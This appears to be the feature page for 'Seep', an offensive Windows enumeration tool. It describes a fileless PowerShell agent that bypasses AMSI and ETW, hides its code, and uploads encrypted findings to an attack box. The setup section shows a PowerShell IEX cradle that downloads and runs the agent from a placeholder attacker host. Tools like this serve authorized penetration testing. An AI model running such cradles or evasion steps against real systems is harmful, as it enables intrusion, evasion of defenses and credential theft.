Features

Comprehensive Windows Enumeration

Fileless agent with modular checks, encrypted transport, and actionable MITRE ATT&CK-mapped recommendations.

16 Enumeration Checks

Token privileges, unquoted service paths, saved credentials, autoruns, scheduled tasks, registry secrets, DLL hijack candidates -- all producing structured JSON with severity ratings.

97-Tool Catalog

Organized across 7 categories with SHA256 integrity verification and self-hosted distribution via GitHub Releases. Download, verify, and serve from one CLI.

MITRE ATT&CK Mapping

Every finding maps to ATT&CK techniques with actionable exploitation guidance, tool suggestions, example commands, and risk ratings sorted by severity.

Fileless Execution

Agent runs entirely in memory via IEX cradle. Results AES-256-CBC encrypted, compressed, and uploaded. AMSI/ETW/SBL bypassed automatically. Zero disk footprint.

Single-File HTML Reports

Dark-themed, self-contained HTML -- no CDN, no external requests. Executive summary, per-finding evidence cards, and MITRE recommendations.

Agent Obfuscation

Cherry-pick checks with --checks / --exclude. Randomize function names, variables, HTTP headers, and check prefixes with --obfuscate.

Architecture

Two-Component Design

Python CLI on the attack box orchestrates everything. Composed PowerShell agent runs on the target.

server/agent/

16 PowerShell check modules with metadata headers, composer with obfuscation

server/catalog/

97 YAML-defined tools with SHA256, concurrent download manager, symlinks

server/http/

Unified HTTP handler for agent delivery, tool serving, and result upload

server/report/

MITRE ATT&CK recommendation engine, HTML/Markdown/JSON generators

Getting Started

Up and Running in 60 Seconds

Python on the attack box, PowerShell on the target. That's it.

deploy.sh
# Install
$ pipx install git+https://github.com/Real-Fruit-Snacks/Seep.git

# Initialize workspace and start server
$ seep init --workdir /tmp/op1
$ seep serve --workdir /tmp/op1

# On target (server prints cradles with auth tokens)
PS> IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/agent.ps1?token=TOKEN')

# Generate report
$ seep report /tmp/op1/results/results_*.json --format html -o report.html
